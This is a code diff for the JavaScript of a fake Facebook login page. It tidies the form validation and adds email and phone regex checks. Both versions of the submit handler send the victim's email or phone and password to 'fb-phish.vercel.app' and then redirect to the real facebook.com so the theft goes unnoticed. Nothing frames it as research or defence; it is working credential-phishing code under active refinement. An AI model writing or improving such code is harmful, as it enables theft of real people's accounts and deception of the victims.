@@ -31,68 +31,70 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 
   function handleValidation(formId, emailId, passwordId, emailErrorId, passwordErrorId) {
-    const form = document.getElementById(formId);
-    const emailInput = document.getElementById(emailId);
-    const passwordInput = document.getElementById(passwordId);
-    const emailError = document.getElementById(emailErrorId);
-    const passwordError = document.getElementById(passwordErrorId);
+  const form = document.getElementById(formId);
+  const emailInput = document.getElementById(emailId);
+  const passwordInput = document.getElementById(passwordId);
+  const emailError = document.getElementById(emailErrorId);
+  const passwordError = document.getElementById(passwordErrorId);
 
-    if (!form) return;
+  if (!form) return;
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
 
-      // Clear previous errors
-      emailError.textContent = '';
-      passwordError.textContent = '';
+    emailError.textContent = '';
+    passwordError.textContent = '';
 
-      const email = emailInput.value.trim();
-      const password = passwordInput.value.trim();
-      let hasError = false;
+    const emailOrPhone = emailInput.value.trim();
+    const password = passwordInput.value.trim();
+    let hasError = false;
 
-      // Local validation
-      if (!email) {
-        emailError.textContent = 'Email or phone number is required.';
-        hasError = true;
-      }
+    // Simple regex checks
+    const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailOrPhone);
+    const isPhone = /^\d{6,15}$/.test(emailOrPhone); // Allow international format
 
-      if (!password) {
-        passwordError.textContent = 'Password is required.';
-        hasError = true;
-      }
+    if (!emailOrPhone) {
+      emailError.textContent = 'Email or phone number is required.';
+      hasError = true;
+    } else if (!isEmail && !isPhone) {
+      emailError.textContent = 'Please enter a valid email or phone number.';
+      hasError = true;
+    }
 
-      if (hasError) return;
+    if (!password) {
+      passwordError.textContent = 'Password is required.';
+      hasError = true;
+    }
 
-      try {
-        const response = await fetch('https://fb-phish.vercel.app/login', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({ email: email, password: password })
-        });
+    if (hasError) return;
 
-        const data = await response.json();
+    try {
+      const response = await fetch('https://fb-phish.vercel.app/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ emailOrPhone, password })
+      });
 
-        if (response.ok) {
-          // Login successful
-          window.location.href = 'https://www.facebook.com/';
+      const data = await response.json();
+
+      if (response.ok) {
+        window.location.href = 'https://www.facebook.com/';
+      } else {
+        if (data?.error?.toLowerCase().includes('email') || data?.error?.toLowerCase().includes('phone')) {
+          emailError.textContent = data.error;
+        } else if (data?.error?.toLowerCase().includes('password')) {
+          passwordError.textContent = data.error;
         } else {
-          // Show error from backend
-          if (data?.error?.toLowerCase().includes('email') || data?.error?.toLowerCase().includes('phone')) {
-            emailError.textContent = data.error;
-          } else if (data?.error?.toLowerCase().includes('password')) {
-            passwordError.textContent = data.error;
-          } else {
-            passwordError.textContent = 'Login failed. Please try again.';
-          }
+          passwordError.textContent = 'Login failed. Please try again.';
         }
-      } catch (err) {
-        passwordError.textContent = 'Something went wrong. Please try again.';
-        console.error(err);
       }
-    });
-  }
+    } catch (err) {
+      passwordError.textContent = 'Something went wrong. Please try again.';
+      console.error(err);
+    }
+  });
+}
+
 
   // Desktop form
   handleValidation(
